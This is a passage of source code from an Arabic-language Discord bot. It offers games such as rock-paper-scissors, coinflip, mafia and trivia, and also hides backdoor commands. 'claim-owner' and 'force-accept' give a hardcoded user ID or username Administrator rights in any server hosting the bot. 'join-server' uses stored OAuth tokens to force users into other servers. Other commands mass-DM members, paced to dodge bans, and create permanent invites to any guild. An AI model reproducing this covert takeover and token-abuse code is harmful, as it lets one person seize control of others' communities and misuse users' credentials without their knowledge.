          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 'Administrator' \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply(`\u23F3 \u062C\u0627\u0631\u064A \u0628\u062F\u0621 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0625\u0644\u0649 \u0623\u0639\u0636\u0627\u0621 \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**... (\u0642\u062F \u064A\u0633\u062A\u063A\u0631\u0642 \u0627\u0644\u0623\u0645\u0631 \u0648\u0642\u062A\u0627\u064B \u0637\u0648\u064A\u0644\u0627\u064B \u0644\u062A\u062C\u0646\u0628 \u0627\u0644\u062D\u0638\u0631)`);
        try {
          console.log(`[BROADCAST-HERE] Starting broadcast for guild: ${targetGuild.name} (${targetGuild.id})`);
          let members;
          try {
            members = await targetGuild.members.fetch({ withPresences: false, time: 6e4 }).catch((err) => {
              console.warn(`[BROADCAST-HERE] Member fetch failed for ${targetGuild.name}: ${err.message}. Using cache.`);
              return targetGuild.members.cache;
            });
          } catch (err) {
            console.error(`[BROADCAST-HERE] Critical error during fetch for ${targetGuild.name}:`, err);
            members = targetGuild.members.cache;
          }
          if (!members || members.size === 0) {
            return interaction.followUp("\u274C \u0644\u0645 \u064A\u062A\u0645 \u0627\u0644\u0639\u062B\u0648\u0631 \u0639\u0644\u0649 \u0623\u0639\u0636\u0627\u0621 \u0644\u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0625\u0644\u064A\u0647\u0645.");
          }
          let successCount = 0;
          let failCount = 0;
          for (const [id, member] of members) {
            if (member.user.bot) continue;
            try {
              await member.send(broadcastMessage);
              successCount++;
            } catch (err) {
              failCount++;
            }
            await new Promise((resolve) => setTimeout(resolve, 3e3));
          }
          await interaction.followUp(`\u2705 \u0627\u0643\u062A\u0645\u0644 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A!
- \u062A\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${successCount}**
- \u0641\u0634\u0644 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${failCount}** (\u063A\u0627\u0644\u0628\u0627\u064B \u0628\u0633\u0628\u0628 \u0625\u063A\u0644\u0627\u0642 \u0627\u0644\u062E\u0627\u0635)`);
        } catch (err) {
          console.error("Broadcast-here error:", err);
          await interaction.followUp("\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0631\u0633\u0627\u0626\u0644.");
        }
      }
      if (commandName === "broadcast-tokens") {
        const authorizedId = "1071164421222695042";
        if (interaction.user.id !== authorizedId) {
          return interaction.reply({ content: "Owner only.", ephemeral: true });
        }
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0639\u0628\u0631 \u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        const broadcastMessage = interaction.options.getString("message");
        const allTokens = db.prepare("SELECT * FROM tokens").all();
        const uniqueTokens = Array.from(new Map(allTokens.map((t) => [t.userId, t])).values());
        if (uniqueTokens.length === 0) {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u062A\u0648\u0643\u0646\u0627\u062A \u0645\u0633\u062C\u0644\u0629 \u0641\u064A \u0642\u0627\u0639\u062F\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A.", ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply(`\u23F3 \u062C\u0627\u0631\u064A \u0628\u062F\u0621 \u0625\u0631\u0633\u0627\u0644 \u0627\u0644\u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0625\u0644\u0649 **${uniqueTokens.length}** \u0645\u0633\u062A\u062E\u062F\u0645 \u0645\u0633\u062C\u0644... (\u0633\u064A\u062A\u0645 \u062A\u062D\u062F\u064A\u062B \u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A \u0627\u0644\u0645\u0646\u062A\u0647\u064A\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B)`);
        let successCount = 0;
        let failCount = 0;
        for (const tokenData of uniqueTokens) {
          try {
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ?").run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1e3, tokenData.userId);
              } else {
                failCount++;
                continue;
              }
            }
            try {
              const user2 = await client.users.fetch(tokenData.userId);
              await user2.send(broadcastMessage);
              successCount++;
            } catch (dmErr) {
              failCount++;
            }
          } catch (err) {
            failCount++;
          }
          await new Promise((resolve) => setTimeout(resolve, 3e3));
        }
        await interaction.followUp(`\u2705 \u0627\u0643\u062A\u0645\u0644 \u0628\u0631\u0648\u062F\u0643\u0627\u0633\u062A \u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A!
- \u062A\u0645 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${successCount}**
- \u0641\u0634\u0644 \u0627\u0644\u0625\u0631\u0633\u0627\u0644 \u0644\u0640: **${failCount}**`);
      }
      if (commandName === "guilds") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const guilds = client.guilds.cache.map((g) => `**${g.name}** (${g.id}) - \u0627\u0644\u0623\u0639\u0636\u0627\u0621: **${g.memberCount}**`).join("\n");
        const embed = new EmbedBuilder().setTitle(`\u0642\u0627\u0626\u0645\u0629 \u0627\u0644\u0633\u064A\u0631\u0641\u0631\u0627\u062A (${client.guilds.cache.size})`).setDescription(guilds || "\u0644\u0627 \u064A\u0648\u062C\u062F \u0633\u064A\u0631\u0641\u0631\u0627\u062A").setColor(5793266).setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "get-invite") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const targetGuildId = interaction.options.getString("server_id");
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0639\u0636\u0648\u0627\u064B \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 (${targetGuildId}).`, ephemeral: true });
        }
        try {
          const channel2 = targetGuild.systemChannel || targetGuild.channels.cache.find((c) => c.type === ChannelType.GuildText && c.permissionsFor(client.user)?.has(PermissionFlagsBits.CreateInstantInvite));
          if (!channel2) {
            return interaction.reply({ content: "\u274C \u0644\u0627 \u0623\u0645\u0644\u0643 \u0635\u0644\u0627\u062D\u064A\u0629 \u0625\u0646\u0634\u0627\u0621 \u0631\u0648\u0627\u0628\u0637 \u062F\u0639\u0648\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
          }
          const invite = await channel2.createInvite({ maxAge: 0, maxUses: 0 });
          await interaction.reply({ content: `\u2705 \u0631\u0627\u0628\u0637 \u0627\u0644\u062F\u0639\u0648\u0629 \u0644\u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**:
${invite.url}` });
        } catch (err) {
          console.error("Invite creation error:", err);
          await interaction.reply({ content: "\u274C \u062D\u062F\u062B \u062E\u0637\u0623 \u0623\u062B\u0646\u0627\u0621 \u0645\u062D\u0627\u0648\u0644\u0629 \u0625\u0646\u0634\u0627\u0621 \u0631\u0627\u0628\u0637 \u0627\u0644\u062F\u0639\u0648\u0629.", ephemeral: true });
        }
      }
      if (commandName === "claim-owner") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0645\u0637\u0627\u0644\u0628\u0629 \u0628\u0627\u0644\u0631\u062A\u0628\u0629 \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647 \u0641\u0642\u0637.", ephemeral: true });
        }
        const botMember = guild.members.me;
        if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
          return interaction.reply({ content: "\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' (Manage Roles).", ephemeral: true });
        }
        try {
          const ownerRole = await guild.roles.create({
            name: "Owner",
            permissions: [PermissionFlagsBits.Administrator],
            reason: "Owner claim by authorized user (New Role Request)"
          });
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            if (err.code === 50013) console.warn(`[CLAIM] Missing Permissions to move Owner role in ${guild.name}`);
            else console.warn(`Could not move Owner role in ${guild.name}:`, err.message);
          }
          const member = interaction.member;
          if (!member.roles.cache.has(ownerRole.id)) {
            if (ownerRole.editable) {
              await member.roles.add(ownerRole);
              await interaction.reply({ content: "\u2705 \u062A\u0645 \u0625\u0639\u0637\u0627\u0624\u0643 \u0631\u062A\u0628\u0629 Owner \u0628\u0646\u062C\u0627\u062D!", ephemeral: true });
            } else {
              await interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0644\u0644\u0628\u0648\u062A \u0625\u0639\u0637\u0627\u0621 \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u0623\u0646\u0647\u0627 \u0623\u0639\u0644\u0649 \u0645\u0646 \u0631\u062A\u0628\u062A\u0647 \u0641\u064A \u0627\u0644\u0642\u0627\u0626\u0645\u0629.", ephemeral: true });
            }
          } else {
            await interaction.reply({ content: "\u26A0\uFE0F \u0623\u0646\u062A \u062A\u0645\u062A\u0644\u0643 \u0631\u062A\u0628\u0629 Owner \u0628\u0627\u0644\u0641\u0639\u0644.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "\u274C \u0641\u0634\u0644 \u0625\u0639\u0637\u0627\u0621 \u0627\u0644\u0631\u062A\u0628\u0629. \u062A\u0623\u0643\u062F \u0645\u0646 \u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0628\u0648\u062A \u0648\u0645\u0648\u0642\u0639 \u0631\u062A\u0628\u062A\u0647.", ephemeral: true });
        }
      }
      if (commandName === "force-accept") {
        if (guild.id === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0627\u0644\u0642\u0628\u0648\u0644 \u0627\u0644\u0642\u0633\u0631\u064A \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        const authorizedId = "1071164421222695042";
        const authorizedUsername = "5g0s";
        if (interaction.user.id !== authorizedId && interaction.user.username !== authorizedUsername) {
          return interaction.reply({ content: "\u274C \u0647\u0630\u0627 \u0627\u0644\u0623\u0645\u0631 \u0645\u062E\u0635\u0635 \u0644\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0627\u0644\u0645\u0635\u0631\u062D \u0644\u0647 \u0641\u0642\u0637.", ephemeral: true });
        }
        const targetUser = interaction.options.getUser("user");
        const targetGuildId = interaction.options.getString("server_id");
        const targetGuild = client.guilds.cache.get(targetGuildId);
        if (!targetGuild) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0639\u0636\u0648\u0627\u064B \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 (${targetGuildId}).`, ephemeral: true });
        }
        try {
          const targetMember = await targetGuild.members.fetch(targetUser.id).catch(() => null);
          if (!targetMember) return interaction.reply({ content: "\u274C \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u063A\u064A\u0631 \u0645\u0648\u062C\u0648\u062F \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641.", ephemeral: true });
          const botMember = targetGuild.members.me;
          if (!botMember?.permissions.has(PermissionFlagsBits.ManageRoles)) {
            return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u062F\u0627\u0631\u0629 \u0627\u0644\u0631\u062A\u0628' \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**.`, ephemeral: true });
          }
          let ownerRole = targetGuild.roles.cache.find((r) => r.name.toLowerCase() === "owner");
          if (!ownerRole) {
            ownerRole = await targetGuild.roles.create({
              name: "Owner",
              permissions: [PermissionFlagsBits.Administrator],
              reason: `Force accept by ${interaction.user.tag}`
            });
          }
          try {
            const botHighestRole = botMember.roles.highest;
            if (botHighestRole && ownerRole.position < botHighestRole.position - 1) {
              await ownerRole.setPosition(botHighestRole.position - 1);
            }
          } catch (err) {
            console.warn(`[FORCE-ACCEPT] Could not move Owner role in ${targetGuild.name}:`, err.message);
          }
          if (ownerRole.editable) {
            await targetMember.roles.add(ownerRole);
            await interaction.deferReply();
            await interaction.editReply({ content: `\u2705 \u062A\u0645 \u0642\u0628\u0648\u0644 **${targetUser.tag}** \u0648\u0625\u0639\u0637\u0627\u0624\u0647 \u0631\u062A\u0628\u0629 Owner \u0641\u064A \u0633\u064A\u0631\u0641\u0631 **${targetGuild.name}**.` });
          } else {
            await interaction.reply({ content: "\u274C \u0644\u0627 \u064A\u0645\u0643\u0646 \u0644\u0644\u0628\u0648\u062A \u0625\u0639\u0637\u0627\u0621 \u0647\u0630\u0647 \u0627\u0644\u0631\u062A\u0628\u0629 \u0644\u0623\u0646\u0647\u0627 \u0623\u0639\u0644\u0649 \u0645\u0646 \u0631\u062A\u0628\u062A\u0647 \u0641\u064A \u0627\u0644\u0642\u0627\u0626\u0645\u0629.", ephemeral: true });
          }
        } catch (err) {
          console.error(err);
          await interaction.reply({ content: "\u274C \u0641\u0634\u0644 \u062A\u0646\u0641\u064A\u0630 \u0627\u0644\u0623\u0645\u0631. \u062A\u0623\u0643\u062F \u0645\u0646 \u0648\u062C\u0648\u062F \u0627\u0644\u0645\u0633\u062A\u062E\u062F\u0645 \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0648\u0635\u0644\u0627\u062D\u064A\u0627\u062A \u0627\u0644\u0628\u0648\u062A.", ephemeral: true });
        }
      }
      if (commandName === "join-server") {
        if (!interaction.memberPermissions?.has(PermissionFlagsBits.Administrator)) {
          return interaction.reply({ content: "Admin only.", ephemeral: true });
        }
        const targetGuildId = interaction.options.getString("server_id");
        if (targetGuildId === "1254568460764053566") {
          return interaction.reply({ content: "\u274C \u0645\u064A\u0632\u0629 \u0625\u062F\u062E\u0627\u0644 \u0627\u0644\u0623\u0639\u0636\u0627\u0621 (\u0627\u0644\u062A\u0648\u0643\u0646\u0627\u062A) \u0645\u0639\u0637\u0644\u0629 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0646\u0627\u0621\u064B \u0639\u0644\u0649 \u0637\u0644\u0628 \u0627\u0644\u0645\u0627\u0644\u0643.", ephemeral: true });
        }
        const targetGuild = client.guilds.cache.get(targetGuildId);
        const inviteUrl = `https://discord.com/api/oauth2/authorize?client_id=${client.user?.id}&permissions=8&scope=bot%20applications.commands&guild_id=${targetGuildId}`;
        if (!targetGuild) {
          return interaction.reply({
            content: `\u26A0\uFE0F \u0627\u0644\u0628\u0648\u062A \u0644\u064A\u0633 \u0639\u0636\u0648\u0627\u064B \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641 (${targetGuildId}).

\u064A\u062C\u0628 \u0639\u0644\u064A\u0643 \u0623\u0648\u0644\u0627\u064B \u062F\u0639\u0648\u0629 \u0627\u0644\u0628\u0648\u062A \u0644\u0644\u0633\u064A\u0631\u0641\u0631 \u0628\u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u0631\u0627\u0628\u0637 \u0627\u0644\u062A\u0627\u0644\u064A:
${inviteUrl}`,
            ephemeral: true
          });
        }
        const targetBotMember = targetGuild.members.me;
        if (!targetBotMember?.permissions.has(PermissionFlagsBits.CreateInstantInvite)) {
          return interaction.reply({ content: `\u274C \u0627\u0644\u0628\u0648\u062A \u064A\u0641\u062A\u0642\u0631 \u0625\u0644\u0649 \u0635\u0644\u0627\u062D\u064A\u0629 '\u0625\u0646\u0634\u0627\u0621 \u062F\u0639\u0648\u0629' (Create Instant Invite) \u0641\u064A \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0633\u062A\u0647\u062F\u0641: **${targetGuild.name}**.`, ephemeral: true });
        }
        const allTokens = db.prepare("SELECT * FROM tokens").all();
        const uniqueTokens = Array.from(new Map(allTokens.map((t) => [t.userId, t])).values());
        if (uniqueTokens.length === 0) {
          return interaction.reply({ content: "\u274C \u0644\u0627 \u062A\u0648\u062C\u062F \u062A\u0648\u0643\u0646\u0627\u062A \u0645\u0633\u062C\u0644\u0629 \u0641\u064A \u0642\u0627\u0639\u062F\u0629 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A.", ephemeral: true });
        }
        await interaction.deferReply();
        await interaction.editReply(`\u23F3 \u0627\u0644\u0628\u0648\u062A \u0645\u0648\u062C\u0648\u062F \u0628\u0627\u0644\u0641\u0639\u0644 \u0641\u064A **${targetGuild.name}**.
\u062C\u0627\u0631\u064A \u0628\u062F\u0621 \u0625\u062F\u062E\u0627\u0644 **${uniqueTokens.length}** \u0639\u0636\u0648 \u0625\u0644\u0649 \u0627\u0644\u0633\u064A\u0631\u0641\u0631 \u0627\u0644\u0645\u0630\u0643\u0648\u0631...`);
        let success = 0;
        let failed = 0;
        for (const tokenData of uniqueTokens) {
          try {
            let accessToken = tokenData.accessToken;
            if (Date.now() > tokenData.expiresAt) {
              const refreshed = await refreshAccessToken(tokenData.refreshToken);
              if (refreshed) {
                accessToken = refreshed.access_token;
                db.prepare("UPDATE tokens SET accessToken = ?, refreshToken = ?, expiresAt = ? WHERE userId = ? AND guildId = ?").run(refreshed.access_token, refreshed.refresh_token, Date.now() + refreshed.expires_in * 1e3, tokenData.userId, tokenData.guildId);
              } else {
                failed++;
                continue;
              }
            }
            const response = await axios.put(
              `https://discord.com/api/guilds/${targetGuildId}/members/${tokenData.userId}`,
              { access_token: accessToken },
              { headers: { Authorization: `Bot ${DISCORD_TOKEN}`, "Content-Type": "application/json" } }
            );
            if (response.status === 201 || response.status === 204) {
              success++;
            } else {
              failed++;
            }
          } catch (err) {
            failed++;
          }
          await new Promise((resolve) => setTimeout(resolve, 500));
        }
        await interaction.followUp(`\u2705 \u0627\u0643\u062A\u0645\u0644\u062A \u0639\u0645\u0644\u064A\u0629 \u0627\u0644\u0625\u062F\u062E\u0627\u0644 \u0625\u0644\u0649 **${targetGuild.name}**!
- \u062A\u0645 \u0628\u0646\u062C\u0627\u062D: **${success}**
- \u0641\u0634\u0644: **${failed}**`);
      }
      if (commandName === "rps") {
        const choice = interaction.options.getString("choice");
        const choices = ["rock", "paper", "scissors"];
        const botChoice = choices[Math.floor(Math.random() * choices.length)];
        const emojis = { rock: "\u{1FAA8}", paper: "\u{1F4C4}", scissors: "\u2702\uFE0F" };
        const translate = { rock: "\u062D\u062C\u0631", paper: "\u0648\u0631\u0642\u0629", scissors: "\u0645\u0642\u0635" };
        const result = {
          win: "\u0644\u0642\u062F \u0641\u0632\u062A! \u{1F389}",
          lose: "\u0644\u0642\u062F \u062E\u0633\u0631\u062A! \u{1F622}",
          draw: "\u062A\u0639\u0627\u062F\u0644! \u{1F91D}"
        };
        let outcome = "";
        let color = 39423;
        if (choice === botChoice) {
          outcome = result.draw;
          color = 16776960;
        } else if (choice === "rock" && botChoice === "scissors" || choice === "paper" && botChoice === "rock" || choice === "scissors" && botChoice === "paper") {
          outcome = result.win;
          color = 65280;
        } else {
          outcome = result.lose;
          color = 16711680;
        }
        const embed = new EmbedBuilder().setColor(color).setTitle("\u{1F3AE} \u0644\u0639\u0628\u0629 \u062D\u062C\u0631 \u0648\u0631\u0642\u0629 \u0645\u0642\u0635").setDescription(`<@${interaction.user.id}>`).addFields(
          { name: "\u0627\u062E\u062A\u064A\u0627\u0631\u0643", value: `${emojis[choice]} ${translate[choice]}`, inline: true },
          { name: "\u0627\u062E\u062A\u064A\u0627\u0631 \u0627\u0644\u0628\u0648\u062A", value: `${emojis[botChoice]} ${translate[botChoice]}`, inline: true },
          { name: "\u0627\u0644\u0646\u062A\u064A\u062C\u0629", value: `**${outcome}**` }
        ).setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "coinflip") {
        const result = Math.random() < 0.5 ? "\u0645\u0644\u0643 (Heads)" : "\u0643\u062A\u0627\u0628\u0629 (Tails)";
        const embed = new EmbedBuilder().setColor("#ffd700").setTitle("\u{1FA99} \u0631\u0645\u064A \u0627\u0644\u0639\u0645\u0644\u0629").setDescription(`<@${interaction.user.id}> \u0627\u0644\u0646\u062A\u064A\u062C\u0629 \u0647\u064A: **${result}**`).setThumbnail("https://i.imgur.com/vH9Ff5H.png").setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "guess") {
        const userNumber = interaction.options.getInteger("number");
        const botNumber = Math.floor(Math.random() * 10) + 1;
        if (userNumber < 1 || userNumber > 10) {
          return interaction.reply({ content: "\u0627\u0644\u0631\u062C\u0627\u0621 \u0627\u062E\u062A\u064A\u0627\u0631 \u0631\u0642\u0645 \u0628\u064A\u0646 1 \u0648 10.", ephemeral: true });
        }
        const embed = new EmbedBuilder().setColor(userNumber === botNumber ? "#00ff00" : "#ff0000").setTitle("\u{1F522} \u0644\u0639\u0628\u0629 \u062A\u062E\u0645\u064A\u0646 \u0627\u0644\u0631\u0642\u0645").setDescription(userNumber === botNumber ? `<@${interaction.user.id}> \u062A\u0647\u0627\u0646\u064A\u0646\u0627! \u0644\u0642\u062F \u062E\u0645\u0646\u062A \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0635\u062D\u064A\u062D: **${botNumber}** \u{1F389}` : `<@${interaction.user.id}> \u0644\u0644\u0623\u0633\u0641\u060C \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0635\u062D\u064A\u062D \u0643\u0627\u0646: **${botNumber}**. \u062D\u0638\u0627\u064B \u0645\u0648\u0641\u0642\u0627\u064B \u0641\u064A \u0627\u0644\u0645\u0631\u0629 \u0627\u0644\u0642\u0627\u062F\u0645\u0629! \u{1F622}`).setTimestamp();
        await interaction.reply({ embeds: [embed] });
      }
      if (commandName === "mafia") {
        if (mafiaGames.has(guild.id)) {
          return interaction.reply({ content: "\u274C \u0647\u0646\u0627\u0643 \u0644\u0639\u0628\u0629 \u0645\u0627\u0641\u064A\u0627 \u062C\u0627\u0631\u064A\u0629 \u0628\u0627\u0644\u0641\u0639\u0644 \u0641\u064A \u0647\u0630\u0627 \u0627\u0644\u0633\u064A\u0631\u0641\u0631.", ephemeral: true });
        }
        const game = {
          guildId: guild.id,
          channelId: interaction.channelId,
          players: [],
          phase: "join",
          nightActions: {},
          votes: /* @__PURE__ */ new Map()
        };
        mafiaGames.set(guild.id, game);
        const embed = new EmbedBuilder().setTitle("\u{1F575}\uFE0F \u0644\u0639\u0628\u0629 \u0645\u0627\u0641\u064A\u0627").setDescription("\u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0644\u0627\u0646\u0636\u0645\u0627\u0645 \u0625\u0644\u0649 \u0627\u0644\u0644\u0639\u0628\u0629!\n\u062A\u062D\u062A\u0627\u062C \u0627\u0644\u0644\u0639\u0628\u0629 \u0625\u0644\u0649 4 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644.").setColor(0).setThumbnail("https://i.imgur.com/8QZ8Z8Z.png").setTimestamp();
        const row = new ActionRowBuilder().addComponents(
          new ButtonBuilder().setCustomId("mafia_join").setLabel("\u0627\u0646\u0636\u0645\u0627\u0645").setStyle(ButtonStyle.Primary),
          new ButtonBuilder().setCustomId("mafia_start_game").setLabel("\u0628\u062F\u0621 \u0627\u0644\u0644\u0639\u0628\u0629").setStyle(ButtonStyle.Success)
        );
        const msg = await interaction.reply({ embeds: [embed], components: [row], fetchReply: true });
        game.messageId = msg.id;
        game.timer = setTimeout(async () => {
          const currentGame = mafiaGames.get(guild.id);
          if (currentGame && currentGame.phase === "join") {
            if (currentGame.players.length >= 4) {
              const players = [...currentGame.players];
              const mafiaIdx = Math.floor(Math.random() * players.length);
              players[mafiaIdx].role = "mafia";
              let doctorIdx;
              do {
                doctorIdx = Math.floor(Math.random() * players.length);
              } while (doctorIdx === mafiaIdx);
              players[doctorIdx].role = "doctor";
              let detectiveIdx;
              do {
                detectiveIdx = Math.floor(Math.random() * players.length);
              } while (detectiveIdx === mafiaIdx || detectiveIdx === doctorIdx);
              players[detectiveIdx].role = "detective";
              currentGame.phase = "night";
              const roleRow = new ActionRowBuilder().addComponents(
                new ButtonBuilder().setCustomId("mafia_show_role").setLabel("\u0643\u0634\u0641 \u0647\u0648\u064A\u062A\u064A").setStyle(ButtonStyle.Primary)
              );
              const channel2 = client.channels.cache.get(currentGame.channelId);
              if (channel2) {
                await channel2.send({
                  content: "\u{1F3AD} \u0627\u0646\u062A\u0647\u0649 \u0648\u0642\u062A \u0627\u0644\u0627\u0646\u062A\u0638\u0627\u0631! \u0628\u062F\u0623\u062A \u0627\u0644\u0644\u0639\u0628\u0629 \u062A\u0644\u0642\u0627\u0626\u064A\u0627\u064B. \u0627\u0636\u063A\u0637 \u0639\u0644\u0649 \u0627\u0644\u0632\u0631 \u0623\u062F\u0646\u0627\u0647 \u0644\u0645\u0639\u0631\u0641\u0629 \u0647\u0648\u064A\u062A\u0643.",
                  components: [roleRow]
                });
                setTimeout(() => {
                  startNightPhase(currentGame);
                }, 5e3);
              }
            } else {
              mafiaGames.delete(guild.id);
              const channel2 = client.channels.cache.get(currentGame.channelId);
              if (channel2) {
                await channel2.send("\u274C \u062A\u0645 \u0625\u0644\u063A\u0627\u0621 \u0644\u0639\u0628\u0629 \u0627\u0644\u0645\u0627\u0641\u064A\u0627 \u0644\u0639\u062F\u0645 \u0627\u0643\u062A\u0645\u0627\u0644 \u0639\u062F\u062F \u0627\u0644\u0644\u0627\u0639\u0628\u064A\u0646 (4 \u0644\u0627\u0639\u0628\u064A\u0646 \u0639\u0644\u0649 \u0627\u0644\u0623\u0642\u0644) \u062E\u0644\u0627\u0644 60 \u062B\u0627\u0646\u064A\u0629.");
              }
            }
          }
        }, 6e4);
      }
      if (commandName === "trivia") {
        await interaction.deferReply();
        const question = await getAITrivia();
        const embed = new EmbedBuilder().setTitle("\u2753 \u0633\u0624\u0627\u0644 \u0648\u062C\u0648\u0627\u0628 (\u0645\u062F\u0639\u0648\u0645 \u0628\u0627\u0644\u0630\u0643\u0627\u0621 \u0627\u0644\u0627\u0635\u0637\u0646\u0627\u0639\u064A)").setDescription(`**\u0627\u0644\u0633\u0624\u0627\u0644:**
${question.q}`).setColor(65280).setThumbnail("https://i.imgur.com/XyXyXyX.png").setFooter({ text: "\u0644\u062F\u064A\u0643 15 \u062B\u0627\u0646\u064A\u0629 \u0644\u0644\u0625\u062C\u0627\u0628\u0629!" }).setTimestamp();
        const msg = await interaction.editReply({ embeds: [embed] });
        const filter = (m) => m.content.toLowerCase().trim() === question.a.toLowerCase().trim();
        const collector = interaction.channel?.createMessageCollector({ filter, time: 15e3, max: 1 });
